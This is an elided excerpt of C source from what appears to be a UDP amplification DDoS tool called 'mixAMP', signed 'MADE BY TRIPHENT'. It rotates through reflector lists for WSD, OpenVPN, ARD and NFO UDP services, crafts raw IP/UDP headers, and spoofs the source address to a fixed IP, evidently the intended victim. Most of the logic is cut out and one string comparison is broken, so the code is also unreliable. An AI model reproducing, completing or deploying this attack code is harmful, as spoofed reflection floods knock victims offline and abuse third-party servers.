...
char * mixAMP_protocol(){
	while(1){
		char *protocol[4];
		protocol[0] = "wsd.txt";
 	  protocol[1] = "openvpn.txt";
		protocol[2] = "ARD.txt";
		protocol[3] = "nfoudp.txt";
...
void *mixAMP_setup(void *par1)
{
	...
	iph->check = 0;
	iph->saddr = inet_addr("167.114.53.154");
	...
	if(mixAMP_protocol() == "openvpn.txt"){
		memcpy((void *)udph + sizeof(struct udphdr), "\x38", 1);
...
{
	if(argc < 5){
	fprintf(stderr, "MADE BY TRIPHENT\n");
